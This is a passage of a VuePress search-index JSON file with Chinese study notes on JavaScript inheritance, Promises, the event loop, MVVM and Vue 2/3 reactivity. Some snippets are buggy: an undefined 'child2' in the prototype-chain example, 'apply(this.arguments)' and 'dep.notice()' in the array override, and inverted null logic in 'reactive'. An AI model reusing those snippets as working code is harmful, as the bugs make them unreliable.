缺点：假如原型中包含有引用类型的属性，那么如果某个对象修改了该属性的值，所有的该原型创建的对象访问的值都会改变\n\nfunction animal() {}\nanimal.prototype = {\n  name: \"animal\",\n  friends: [\"dog\", \"cat\"],\n  sayname: function () {\n    alert(this.name);\n  },\n};\nvar a1 = new animal();\nvar a2 = new animal();\na2.friends.push(\"snake\");\nalert(a2.friends); //[dog,cat,snake]\nalert(a1.friends); //[dog,cat,snake]\n\n\n构造函数 + 原型的组合模式 属性在函数中初始化，方法添加到原型上\n\nfunction animal(name) {\n  this.name = name;\n  this.friends = [\"dog\", \"cat\"];\n}\nanimal.prototype.sayname = function () {\n  alert(this.name);\n};\nvar a1 = new animal(\"d\");\nvar a2 = new animal(\"c\");\na1.friends.push(\"snake\");\nalert(a1.friends); //[dog,caxt,snake]\nalert(a2.friends); //[dog,cat]\n\n\n\n# 继承\n\n * 原型链继承\n * 借用构造函数继承\n * 组合继承\n * 原型式继承\n * 寄生式继承\n * 寄生组合式继承\n * class extends\n\n原型链继承\n\nfunction parent1() {\n  this.name = \"parent1\";\n  this.play = [1, 2, 3];\n}\nfunction child1() {\n  this.type = \"child2\";\n}\nchild1.prototype = new parent1();\nchild2.prototype = new parent1();\nconsole.log(new child1());\n\nlet s1 = new child1();\nlet s2 = new child2();\ns1.play.push(4);\nconsole.log(s1.play, s2.play); //打印的都是[1,2,3,4]\n// 缺点:两个实例使用的是同一个原型对象。它们的内存空间是共享的，当一个发生变化的时候，另外一个也随之进行了变化，这就是使用原型链继承方式的一个缺点\n\n\n借用构造函数继承\n\nfunction fruit(name) {\n  this.name = name;\n}\nfunction apple() {\n  fruit.call(this, \"apple\");\n}\n\n\n组合继承\n\nfunction fruit(name) {\n  this.name = name;\n}\nfruit.prototype.sayname = function () {\n  console.log(this.name);\n};\n\nfunction apple(name) {\n  fruit.call(this, name);\n}\napple.prototype = new fruit();\napple.prototype.constructor = apple;\n\n\n原型式继承\n\nfunction object(o) {\n  function f() {}\n  f.prototype = o;\n  return new f();\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "MVVM",
      "frontmatter": {
        "title": "MVVM"
      },
      "regularPath": "/webstudy/Vue2/MVVM.html",
      "relativePath": "webstudy/Vue2/MVVM.md",
      "key": "v-7b7cad34",
      "path": "/webstudy/Vue2/MVVM.html",
      "headers": [
        {
          "level": 2,
          "title": "MVC 原理",
          "slug": "mvc-原理",
          "normalizedTitle": "mvc 原理",
          "charIndex": 11
        },
        {
          "level": 2,
          "title": "MVVM 原理",
          "slug": "mvvm-原理",
          "normalizedTitle": "mvvm 原理",
          "charIndex": 116
        },
        {
          "level": 2,
          "title": "Vue中的MVVM",
          "slug": "vue中的mvvm",
          "normalizedTitle": "vue中的mvvm",
          "charIndex": 130
        }
      ],
      "headersStr": "MVC 原理 MVVM 原理 Vue中的MVVM",
      "content": "# MVVM\n\n\n# MVC 原理\n\n * View 传送指令到 Controller\n * Controller 完成业务逻辑后，要求 Model 改变状态\n * Model 将新的数据发送到 View，用户得到反馈\n\n\n\n\n# MVVM 原理\n\n\n\n\n# Vue中的MVVM\n\n> 视图层和数据层的双向绑定，让我们无需再去关心DOM操作的事情，更多的精力放在数据和业务逻辑上去\n\n\n\n * View 即 Vue template\n * Model 即 Vue data\n * VM 即 Vue 其他核心功能，负责 View 和 Model 通讯",
      "normalizedContent": "# mvvm\n\n\n# mvc 原理\n\n * view 传送指令到 controller\n * controller 完成业务逻辑后，要求 model 改变状态\n * model 将新的数据发送到 view，用户得到反馈\n\n\n\n\n# mvvm 原理\n\n\n\n\n# vue中的mvvm\n\n> 视图层和数据层的双向绑定，让我们无需再去关心dom操作的事情，更多的精力放在数据和业务逻辑上去\n\n\n\n * view 即 vue template\n * model 即 vue data\n * vm 即 vue 其他核心功能，负责 view 和 model 通讯",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "同步和异步",
      "frontmatter": {
        "title": "同步和异步"
      },
      "regularPath": "/webstudy/Javascript/%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5.html",
      "relativePath": "webstudy/Javascript/同步和异步.md",
      "key": "v-30d3c3c0",
      "path": "/webstudy/Javascript/%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5.html",
      "headers": [
        {
          "level": 2,
          "title": "单线程和异步",
          "slug": "单线程和异步",
          "normalizedTitle": "单线程和异步",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "js 为什么是单线程",
          "slug": "js-为什么是单线程",
          "normalizedTitle": "js 为什么是单线程",
          "charIndex": 13
        },
        {
          "level": 3,
          "title": "callback hell(回调地狱)",
          "slug": "callback-hell-回调地狱",
          "normalizedTitle": "callback hell(回调地狱)",
          "charIndex": 264
        },
        {
          "level": 3,
          "title": "Promise",
          "slug": "promise",
          "normalizedTitle": "promise",
          "charIndex": 452
        },
        {
          "level": 3,
          "title": "事件循环（Event Loop）",
          "slug": "事件循环-event-loop",
          "normalizedTitle": "事件循环（event loop）",
          "charIndex": 2791
        }
      ],
      "headersStr": "单线程和异步 js 为什么是单线程 callback hell(回调地狱) Promise 事件循环（Event Loop）",
      "content": "# 单线程和异步\n\n\n# js 为什么是单线程\n\n * 作为浏览器脚本语言，JavaScript 的主要用途是与用户互动，以及操作 DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定 JavaScript 同时有两个线程，一个线程在某个 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准\n\n * Js 就是单线程语言\n\n * Js 和 DOM 渲染共用一个进程， 因为 js 可以修改 DOM\n\n * 基于 js 是单线程语言，异步不会阻塞代码执行，同步会阻塞代码执行\n\n\n# callback hell(回调地狱)\n\najax1(url, () => {\n  ajax2(url, () => {\n    ajax3(url, () => {\n      doSomething();\n    });\n  });\n});\n\n\n * 如果有多层嵌套，代码耦合严重，那后续的维护，业务修改，原地爆炸\n * 无法使用try catch,也就无法排错\n\n\n# Promise\n\n嗨起来的 promise 面试题\n\n# 介绍\n\n * 三种状态： 等待态（Pending）、执行态（Fulfilled）和拒绝态（Rejected）\n * 状态只能由 Pending 变为 Fulfilled 或由 Pending 变为 Rejected ，且状态改变之后不会在发生变化，会一直保持这个状态。\n * Pending 变为 Fulfilled 会得到一个私有 value，Pending 变为 Rejected 会得到一个私有 reason，当 Promise 达到了 Fulfilled 或 Rejected 时，执行的异步代码会接收到这个 value 或 reason。\n\n# Promise.all()——短路特性\n\n * 如果所有都成功，则合成 Promise 的返回值就是所有子 Promise 的返回值数组。\n * 如果有一个失败，那么第一个失败的会把自己的理由作为合成 Promise 的失败理由\n\nlet p1 = new Promise((resolve, reject) => {\n  resolve(\"success1\");\n});\n\nlet p2 = new Promise((resolve, reject) => {\n  resolve(\"success1\");\n});\n// let p3 = Promise.reject('failed3')\nPromise.all([p1, p2])\n  .then((result) => {\n    console.log(result); // ['success1', 'success2']\n  })\n  .catch((error) => {\n    console.log(error);\n  });\n// Promise.all([p1,p3,p2]).then((result) => {\n//     console.log(result)\n// }).catch((error) => {\n//     console.log(error) //  'failed3'\n//\n// })\n\n\n# Promise.allSettled()——用于解决 primise.all 的短路问题\n\n * Promise.allSettled 跟 Promise.all 类似, 其参数接受一个 Promise 的数组, 返回一个新的 Promise\n * 唯一的不同在于, 其不会进行短路, 也就是说当 Promise 全部处理完成后我们可以拿到每个 Promise 的状态, 而不管其是否处理成功.\n\nPromise.allSettled([\n  Promise.reject({ code: 500, msg: \"服务异常\" }),\n  Promise.resolve({ code: 200, list: [] }),\n  Promise.resolve({ ode: 200, list: [] }),\n]).then((ret) => {\n  /*\n            0: {status: \"rejected\", reason: {…}}\n             1: {status: \"fulfilled\", value: {…}}\n             2: {status: \"fulfilled\", value: {…}}   */\n  // 过滤掉 rejected 状态，尽可能多的保证页面区域数据渲染\n  RenderContent(\n    ret.filter((el) => {\n      return el.status !== \"rejected\";\n    })\n  );\n});\n\n\n# Promsie.race()\n\n# 手写 Promise\n\nclass Promise {\n  constructor(executor) {\n    // 初始化state为等待态\n    this.state = \"pending\";\n    // 成功的值\n    this.value = undefined;\n    // 失败的原因\n    this.reason = undefined;\n    let resolve = (value) => {\n      if (this.state === \"pending\") {\n        // resolve调用后，state转化为成功态\n        this.state = \"fulfilled\";\n        // 储存成功的值\n        this.value = value;\n      }\n    };\n    let reject = (reason) => {\n      // state改变,reject调用就会失败\n      if (this.state === \"pending\") {\n        // reject调用后，state转化为失败态\n        this.state = \"rejected\";\n        // 储存失败的原因\n        this.reason = reason;\n      }\n    };\n    // 如果executor执行报错，直接执行reject\n    try {\n      executor(resolve, reject);\n    } catch (err) {\n      reject(err);\n    }\n  }\n}\n\n\n\n# 事件循环（Event Loop）\n\n一篇文章 一篇形象的文章\n\n# 1、执行栈与任务队列\n\n//请写出输出内容\nasync function async1() {\n  console.log(\"async1 start\");\n  await async2();\n  console.log(\"async1 end\");\n}\nasync function async2() {\n  console.log(\"async2\");\n}\n\nconsole.log(\"script start\");\n\nsetTimeout(function () {\n  console.log(\"setTimeout\");\n}, 0);\n\nasync1();\n\nnew Promise(function (resolve) {\n  console.log(\"promise1\");\n  resolve();\n}).then(function () {\n  console.log(\"promise2\");\n});\nconsole.log(\"script end\");\n\n/*\nscript start\nasync1 start\nasync2\npromise1\nscript end\nasync1 end\npromise2\nsetTimeout\n*/\n\n\n# 2、宏任务(macro task)与微任务(micro task)",
      "normalizedContent": "# 单线程和异步\n\n\n# js 为什么是单线程\n\n * 作为浏览器脚本语言，javascript 的主要用途是与用户互动，以及操作 dom。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定 javascript 同时有两个线程，一个线程在某个 dom 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准\n\n * js 就是单线程语言\n\n * js 和 dom 渲染共用一个进程， 因为 js 可以修改 dom\n\n * 基于 js 是单线程语言，异步不会阻塞代码执行，同步会阻塞代码执行\n\n\n# callback hell(回调地狱)\n\najax1(url, () => {\n  ajax2(url, () => {\n    ajax3(url, () => {\n      dosomething();\n    });\n  });\n});\n\n\n * 如果有多层嵌套，代码耦合严重，那后续的维护，业务修改，原地爆炸\n * 无法使用try catch,也就无法排错\n\n\n# promise\n\n嗨起来的 promise 面试题\n\n# 介绍\n\n * 三种状态： 等待态（pending）、执行态（fulfilled）和拒绝态（rejected）\n * 状态只能由 pending 变为 fulfilled 或由 pending 变为 rejected ，且状态改变之后不会在发生变化，会一直保持这个状态。\n * pending 变为 fulfilled 会得到一个私有 value，pending 变为 rejected 会得到一个私有 reason，当 promise 达到了 fulfilled 或 rejected 时，执行的异步代码会接收到这个 value 或 reason。\n\n# promise.all()——短路特性\n\n * 如果所有都成功，则合成 promise 的返回值就是所有子 promise 的返回值数组。\n * 如果有一个失败，那么第一个失败的会把自己的理由作为合成 promise 的失败理由\n\nlet p1 = new promise((resolve, reject) => {\n  resolve(\"success1\");\n});\n\nlet p2 = new promise((resolve, reject) => {\n  resolve(\"success1\");\n});\n// let p3 = promise.reject('failed3')\npromise.all([p1, p2])\n  .then((result) => {\n    console.log(result); // ['success1', 'success2']\n  })\n  .catch((error) => {\n    console.log(error);\n  });\n// promise.all([p1,p3,p2]).then((result) => {\n//     console.log(result)\n// }).catch((error) => {\n//     console.log(error) //  'failed3'\n//\n// })\n\n\n# promise.allsettled()——用于解决 primise.all 的短路问题\n\n * promise.allsettled 跟 promise.all 类似, 其参数接受一个 promise 的数组, 返回一个新的 promise\n * 唯一的不同在于, 其不会进行短路, 也就是说当 promise 全部处理完成后我们可以拿到每个 promise 的状态, 而不管其是否处理成功.\n\npromise.allsettled([\n  promise.reject({ code: 500, msg: \"服务异常\" }),\n  promise.resolve({ code: 200, list: [] }),\n  promise.resolve({ ode: 200, list: [] }),\n]).then((ret) => {\n  /*\n            0: {status: \"rejected\", reason: {…}}\n             1: {status: \"fulfilled\", value: {…}}\n             2: {status: \"fulfilled\", value: {…}}   */\n  // 过滤掉 rejected 状态，尽可能多的保证页面区域数据渲染\n  rendercontent(\n    ret.filter((el) => {\n      return el.status !== \"rejected\";\n    })\n  );\n});\n\n\n# promsie.race()\n\n# 手写 promise\n\nclass promise {\n  constructor(executor) {\n    // 初始化state为等待态\n    this.state = \"pending\";\n    // 成功的值\n    this.value = undefined;\n    // 失败的原因\n    this.reason = undefined;\n    let resolve = (value) => {\n      if (this.state === \"pending\") {\n        // resolve调用后，state转化为成功态\n        this.state = \"fulfilled\";\n        // 储存成功的值\n        this.value = value;\n      }\n    };\n    let reject = (reason) => {\n      // state改变,reject调用就会失败\n      if (this.state === \"pending\") {\n        // reject调用后，state转化为失败态\n        this.state = \"rejected\";\n        // 储存失败的原因\n        this.reason = reason;\n      }\n    };\n    // 如果executor执行报错，直接执行reject\n    try {\n      executor(resolve, reject);\n    } catch (err) {\n      reject(err);\n    }\n  }\n}\n\n\n\n# 事件循环（event loop）\n\n一篇文章 一篇形象的文章\n\n# 1、执行栈与任务队列\n\n//请写出输出内容\nasync function async1() {\n  console.log(\"async1 start\");\n  await async2();\n  console.log(\"async1 end\");\n}\nasync function async2() {\n  console.log(\"async2\");\n}\n\nconsole.log(\"script start\");\n\nsettimeout(function () {\n  console.log(\"settimeout\");\n}, 0);\n\nasync1();\n\nnew promise(function (resolve) {\n  console.log(\"promise1\");\n  resolve();\n}).then(function () {\n  console.log(\"promise2\");\n});\nconsole.log(\"script end\");\n\n/*\nscript start\nasync1 start\nasync2\npromise1\nscript end\nasync1 end\npromise2\nsettimeout\n*/\n\n\n# 2、宏任务(macro task)与微任务(micro task)",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "web",
      "frontmatter": {},
      "regularPath": "/webstudy/",
      "relativePath": "webstudy/README.md",
      "key": "v-779e2c82",
      "path": "/webstudy/",
      "headers": [
        {
          "level": 2,
          "title": "Javascript",
          "slug": "javascript",
          "normalizedTitle": "javascript",
          "charIndex": 10
        },
        {
          "level": 2,
          "title": "ES6 及以上",
          "slug": "es6-及以上",
          "normalizedTitle": "es6 及以上",
          "charIndex": 101
        },
        {
          "level": 2,
          "title": "VUE2",
          "slug": "vue2",
          "normalizedTitle": "vue2",
          "charIndex": 151
        },
        {
          "level": 2,
          "title": "VUE3",
          "slug": "vue3",
          "normalizedTitle": "vue3",
          "charIndex": 269
        },
        {
          "level": 2,
          "title": "TS",
          "slug": "ts",
          "normalizedTitle": "ts",
          "charIndex": 305
        },
        {
          "level": 2,
          "title": "HTML",
          "slug": "html",
          "normalizedTitle": "html",
          "charIndex": 329
        },
        {
          "level": 2,
          "title": "CSS",
          "slug": "css",
          "normalizedTitle": "css",
          "charIndex": 374
        },
        {
          "level": 2,
          "title": "HTTP",
          "slug": "http",
          "normalizedTitle": "http",
          "charIndex": 431
        },
        {
          "level": 2,
          "title": "运行环境",
          "slug": "运行环境",
          "normalizedTitle": "运行环境",
          "charIndex": 574
        },
        {
          "level": 2,
          "title": "工程化",
          "slug": "工程化",
          "normalizedTitle": "工程化",
          "charIndex": 610
        },
        {
          "level": 2,
          "title": "Experience",
          "slug": "experience",
          "normalizedTitle": "experience",
          "charIndex": 708
        },
        {
          "level": 2,
          "title": "Nodejs",
          "slug": "nodejs",
          "normalizedTitle": "nodejs",
          "charIndex": 742
        },
        {
          "level": 2,
          "title": "项目",
          "slug": "项目",
          "normalizedTitle": "项目",
          "charIndex": 785
        },
        {
          "level": 2,
          "title": "设计模式",
          "slug": "设计模式",
          "normalizedTitle": "设计模式",
          "charIndex": 801
        }
      ],
      "headersStr": "Javascript ES6 及以上 VUE2 VUE3 TS HTML CSS HTTP 运行环境 工程化 Experience Nodejs 项目 设计模式",
      "content": "# web\n\n\n# Javascript\n\n * 堆栈模型⭐\n * 原型和原型链⭐\n * 作用域和闭包\n * 内存泄露和垃圾回收\n * 同步和异步\n * JS 严格模式\n * 对象的创建与继承\n\n\n# ES6 及以上\n\n * 箭头函数⭐⭐⭐\n * reduce\n * for await of\n\n\n# VUE2\n\n * 特性\n * MVVM\n * Vue 生命周期\n * Vue 响应式原理\n * 组件通讯\n * computed 和 watch\n * key\n * 虚拟 dom 和 diff 算法\n * vue-router\n\n\n# VUE3\n\n * vue3 相比于 vue2\n * Proxy\n\n\n# TS\n\n * vue 中 ts 的使用\n\n\n# HTML\n\n * node 和 element\n * defer 和 async\n\n\n# CSS\n\n * flex⭐\n * 文字超出省略\n * 零碎的知识\n * Retina 屏幕 1px 宽度\n\n\n# HTTP\n\n * 状态码\n * ajax-fetch-axios\n * Http 协议 1.0,1.1,2.0\n * token 和 cookie\n * TCP 三次握手四次挥手\n * TCP 和 UDP\n * 浏览器的缓存机制\n * 网页多标签通讯\n * webSocket\n\n\n# 运行环境\n\n * 网页的加载和渲染\n * 性能优化\n * 安全\n\n\n# 工程化\n\n * 前端工程化\n * webpack-loader 和 plugin\n * webpack 优化\n * vue.config.js 配置案例\n * babel\n * vite\n\n\n# Experience\n\n * 首屏优化\n * Vue 优化\n\n\n# Nodejs\n\n * nodejs 多进程\n * 中间件⭐\n * 洋葱模型⭐\n\n\n# 项目\n\n * 权限设计\n\n\n# 设计模式\n\n * 设计模式⭐",
      "normalizedContent": "# web\n\n\n# javascript\n\n * 堆栈模型⭐\n * 原型和原型链⭐\n * 作用域和闭包\n * 内存泄露和垃圾回收\n * 同步和异步\n * js 严格模式\n * 对象的创建与继承\n\n\n# es6 及以上\n\n * 箭头函数⭐⭐⭐\n * reduce\n * for await of\n\n\n# vue2\n\n * 特性\n * mvvm\n * vue 生命周期\n * vue 响应式原理\n * 组件通讯\n * computed 和 watch\n * key\n * 虚拟 dom 和 diff 算法\n * vue-router\n\n\n# vue3\n\n * vue3 相比于 vue2\n * proxy\n\n\n# ts\n\n * vue 中 ts 的使用\n\n\n# html\n\n * node 和 element\n * defer 和 async\n\n\n# css\n\n * flex⭐\n * 文字超出省略\n * 零碎的知识\n * retina 屏幕 1px 宽度\n\n\n# http\n\n * 状态码\n * ajax-fetch-axios\n * http 协议 1.0,1.1,2.0\n * token 和 cookie\n * tcp 三次握手四次挥手\n * tcp 和 udp\n * 浏览器的缓存机制\n * 网页多标签通讯\n * websocket\n\n\n# 运行环境\n\n * 网页的加载和渲染\n * 性能优化\n * 安全\n\n\n# 工程化\n\n * 前端工程化\n * webpack-loader 和 plugin\n * webpack 优化\n * vue.config.js 配置案例\n * babel\n * vite\n\n\n# experience\n\n * 首屏优化\n * vue 优化\n\n\n# nodejs\n\n * nodejs 多进程\n * 中间件⭐\n * 洋葱模型⭐\n\n\n# 项目\n\n * 权限设计\n\n\n# 设计模式\n\n * 设计模式⭐",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "computed和watch",
      "frontmatter": {
        "title": "computed和watch"
      },
      "regularPath": "/webstudy/Vue2/computed%E5%92%8Cwatch.html",
      "relativePath": "webstudy/Vue2/computed和watch.md",
      "key": "v-6a9e8fe1",
      "path": "/webstudy/Vue2/computed%E5%92%8Cwatch.html",
      "headers": [
        {
          "level": 2,
          "title": "computed和watch",
          "slug": "computed和watch",
          "normalizedTitle": "computed和watch",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "区别",
          "slug": "区别",
          "normalizedTitle": "区别",
          "charIndex": 21
        },
        {
          "level": 3,
          "title": "使用",
          "slug": "使用",
          "normalizedTitle": "使用",
          "charIndex": 152
        }
      ],
      "headersStr": "computed和watch 区别 使用",
      "content": "# computed和watch\n\n\n# 区别\n\n# computed\n\n * computed用于计算产生新的数据\n * 支持缓存，只有依赖数据发生变化时，才会重新进行计算\n\n# watch\n\n * 不支持缓存，当数据变化时，会直接触发对应的操作\n * watch监听现有数据，来继续某些逻辑\n\n\n# 使用\n\n自行查询Vue文档",
      "normalizedContent": "# computed和watch\n\n\n# 区别\n\n# computed\n\n * computed用于计算产生新的数据\n * 支持缓存，只有依赖数据发生变化时，才会重新进行计算\n\n# watch\n\n * 不支持缓存，当数据变化时，会直接触发对应的操作\n * watch监听现有数据，来继续某些逻辑\n\n\n# 使用\n\n自行查询vue文档",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "vue 中 ts 的使用",
      "frontmatter": {},
      "regularPath": "/webstudy/TS/vue%E4%B8%ADts%E7%9A%84%E4%BD%BF%E7%94%A8.html",
      "relativePath": "webstudy/TS/vue中ts的使用.md",
      "key": "v-a8f37c36",
      "path": "/webstudy/TS/vue%E4%B8%ADts%E7%9A%84%E4%BD%BF%E7%94%A8.html",
      "headersStr": null,
      "content": "# vue 中 ts 的使用\n\n整体的思路理一下",
      "normalizedContent": "# vue 中 ts 的使用\n\n整体的思路理一下",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Vue响应式原理",
      "frontmatter": {
        "title": "Vue响应式原理"
      },
      "regularPath": "/webstudy/Vue2/Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86.html",
      "relativePath": "webstudy/Vue2/Vue响应式原理.md",
      "key": "v-06e03a62",
      "path": "/webstudy/Vue2/Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86.html",
      "headers": [
        {
          "level": 2,
          "title": "Vue 响应式原理的核⼼就是Observer、Dep、Watcher",
          "slug": "vue-响应式原理的核心就是observer、dep、watcher",
          "normalizedTitle": "vue 响应式原理的核⼼就是observer、dep、watcher",
          "charIndex": 26
        },
        {
          "level": 2,
          "title": "如何监听数据的变化",
          "slug": "如何监听数据的变化",
          "normalizedTitle": "如何监听数据的变化",
          "charIndex": 212
        },
        {
          "level": 3,
          "title": "Observer观察者",
          "slug": "observer观察者",
          "normalizedTitle": "observer观察者",
          "charIndex": 226
        },
        {
          "level": 3,
          "title": "Dep依赖管理",
          "slug": "dep依赖管理",
          "normalizedTitle": "dep依赖管理",
          "charIndex": 2922
        },
        {
          "level": 3,
          "title": "Watcher订阅者",
          "slug": "watcher订阅者",
          "normalizedTitle": "watcher订阅者",
          "charIndex": 3118
        },
        {
          "level": 2,
          "title": "Vue2 响应式",
          "slug": "vue2-响应式",
          "normalizedTitle": "vue2 响应式",
          "charIndex": 3265
        },
        {
          "level": 3,
          "title": "缺点",
          "slug": "缺点",
          "normalizedTitle": "缺点",
          "charIndex": 2411
        },
        {
          "level": 3,
          "title": "缺点的弥补",
          "slug": "缺点的弥补",
          "normalizedTitle": "缺点的弥补",
          "charIndex": 3508
        },
        {
          "level": 2,
          "title": "Vue3 响应式",
          "slug": "vue3-响应式",
          "normalizedTitle": "vue3 响应式",
          "charIndex": 3837
        }
      ],
      "headersStr": "Vue 响应式原理的核⼼就是Observer、Dep、Watcher 如何监听数据的变化 Observer观察者 Dep依赖管理 Watcher订阅者 Vue2 响应式 缺点 缺点的弥补 Vue3 响应式",
      "content": "# Vue 的响应式原理\n\nVue源码解读\n\n\n# Vue 响应式原理的核⼼就是Observer、Dep、Watcher\n\n一篇异常详细的掘金\n\n * Observer 中进⾏响应式的绑定，监听数据变化，在数据被读的时候，触发 get ⽅法，执⾏ Dep 来收集依赖，也就是收集 Watcher\n * 在数据被改的时候，触发 set ⽅法，通过对应的所有依赖(Watcher)，去执⾏更新。\n\nvue 文档中的原图\n\n\n# 如何监听数据的变化\n\n\n# Observer观察者\n\n简单说就是通过劫持数据，在 setter 中向 Dep（调度中心）添加观察者，在 getter 中通知观察者更新\n\n详细一点Object.defineProperty()\n\n * 对象传入 vue 实例作为 data 选项\n * Vue 将遍历此对象所有的property，通过Object.defineProperty把 property 转化为getter/setter\n * 当 Observer 中对象的属性被访问，则通过 getter 返回值\n * 当 Observer 中对象的属性被编辑修改，则通过 setter 更新 data 中的值\n\n思考三个问题？ 1、Vue2的深度监听 2、对于对象的新增属性，vue如何实现数据绑定 3、如何对数组进行监听，如下代码中有写到\n\n// 模拟触发更新视图\nfunction updateView() {\n    console.log('视图更新')\n}\n\n// 重新定义数组原型\nconst oldArrayProperty = Array.prototype\n// 创建新对象，原型指向 oldArrayProperty ，再扩展新的方法不会影响原型\nconst arrProto = Object.create(oldArrayProperty);\n['push', 'pop', 'shift', 'unshift', 'splice'].forEach(methodName => {\n    arrProto[methodName] = function () {\n        updateView() // 触发视图更新\n        oldArrayProperty[methodName].call(this, ...arguments)\n        // Array.prototype.push.call(this, ...arguments)\n    }\n})\n\n// 重新定义属性，监听起来\nfunction defineReactive(target, key, value) {\n    // 深度监听\n    observer(value)\n    // 核心 API\n    Object.defineProperty(target, key, {\n        get() {\n            return value\n        },\n        set(newValue) {\n            if (newValue !== value) {\n                // 深度监听\n                observer(newValue)\n\n                // 设置新值\n                // 注意，value 一直在闭包中，此处设置完之后，再 get 时也是会获取最新的值\n                value = newValue\n\n                // 触发更新视图\n                updateView()\n            }\n        }\n    })\n}\n// 监听对象属性\nfunction observer(target) {\n    if (typeof target !== 'object' || target === null) {\n        // 不是对象或数组\n        return target\n    }\n    // 污染全局的 Array 原型\n    // Array.prototype.push = function () {\n    //     updateView()\n    //     ...\n    // }\n    if (Array.isArray(target)) {\n        target.__proto__ = arrProto\n    }\n\n    // 重新定义各个属性（for in 也可以遍历数组）\n    for (let key in target) {\n        defineReactive(target, key, target[key])\n    }\n}\n// 准备数据\nconst data = {\n    name: 'zhangsan',\n    age: 18,\n    info: {\n        address: 'shanghai' // 需要深度监听\n    },\n    nums: [10, 20, 30]\n}\n// 监听数据\nobserver(data)\n\n\ndata.name = 'lisi'\ndata.age = 21\ndata.x = '100' // 新增属性，监听不到 —— 所以有 Vue.set\ndelete data.name // 删除属性，监听不到 —— 所有已 Vue.delete\ndata.info.address = '上海' // 深度监听\ndata.nums.push(4) // 监听数组\n\n\n# defineProperty的缺点\n\n 1. 深度监听需要通过递归实现，比如对象内对象多层嵌套的双向绑定需要进行递归\n 2. 无法监听新增属性和删除属性，需要使用Vue.set,Vue.delete\n 3. 无法直接监听数组的一些操作，那为什么我们在使用vue时候是可以监听数组的呢？因为vue对数组的一些方法进行重写，如上代码（为了不污染全局的Array原型，使用Object.create()创建新的对象，新对象中新增编辑的方法不会污染原生的Array）\n\n# 请问vue2源码重写了哪些数组方法\n\n重写了会改变数组自身的方法\n\n[\n  'push',//向数组的末尾添加一个或更多元素，并返回新的长度。\n  'pop',//删除数组的最后一个元素并返回删除的元素。\n  'shift',//    删除并返回数组的第一个元素。\n  'unshift',//向数组的开头添加一个或更多元素，并返回新的长度。\n  'reverse',//反转数组的元素顺序。\n  'sort',//对数组进行排序（可以穿进去一个函数）\n  'splice',//splice(n,m)删除数组的第n个到第m-1个（不包含m个）从数组中添加或删除元素。\n]\n\n\n\n# Dep依赖管理\n\n收集依赖，通知观察者\n\nDep 扮演的角色是调度中心/订阅器，主要的作用就是收集观察者 Watcher 和通知观察者目标更新。每个属性拥有自己的消息订阅器 dep，用于存放所有订阅了该属性的观察者对象，当数据发生改变时，会遍历观察者列表（dep.subs），通过 dep.notify()所有的 watch，让订阅者 watcher 执行自己的 update 逻辑\n\n\n# Watcher订阅者\n\nWatcher 扮演的角色是订阅者，他的主要作用是为观察属性提供回调函数以及收集依赖（如计算属性 computed，vue 会把该属性所依赖数据的 dep 添加到自身的 deps 中），当被观察的值发生变化时，会接收到来自 dep 的通知，从而触发回调函数\n\n\n\n\n# Vue2 响应式\n\n通过 Object.defineProperty API 劫持数据的变化，在数据被访问的时候收集依赖，然后在数据被修改的时候通知依赖更新\n\n\n# 缺点\n\n * Object.defineProperty 只对初始对象里的属性有监听作用，而对新增的属性无效,所以有Vue.$set，$delete\n * 对数组的操作有限,利用索引直接设置一个数组项时,当你修改数组的长度都不是响应式\n * 需要对每个属性进行遍历监听，如果嵌套对象，需要深层监听，造成性能问题\n\n\n# 缺点的弥补\n\n * set、delete方法\n * 重写数组方法\n\n// 数组重写\nconst originalProto = Array.prototype\nconst arrayProto = Object.create(originalProto)\n['push', 'pop', 'shift', 'unshift', 'splice', 'reverse', 'sort'].forEach(method => {\n  arrayProto[method] = function () {\n    originalProto[method].apply(this.arguments)\n    dep.notice()\n  }\n});\n\n\n\n\n# Vue3 响应式\n\nProxy直接可以劫持整个对象，并返回一个新对象，我们可以只操作新的对象达到响应式目的\n\nfunction reactive(obj) {\n  if (typeof obj !== \"object\" && obj != null) {\n    return obj;\n  }\n  const observed = new Proxy(obj, {\n    get(target, key, receiver) {\n      const res = Reflect.get(target, key, receiver);\n      console.log(`获取${key}:${res}`);\n      return res;\n    },\n    set(target, key, value, receiver) {\n      const res = Reflect.set(target, key, value, receiver);\n      console.log(`设置${key}:${value}`);\n      return res;\n    },\n    deleteProperty(target, key) {\n      const res = Reflect.deleteProperty(target, key);\n      console.log(`删除${key}:${res}`);\n      return res;\n    },\n  });\n  return observed;\n}\n",
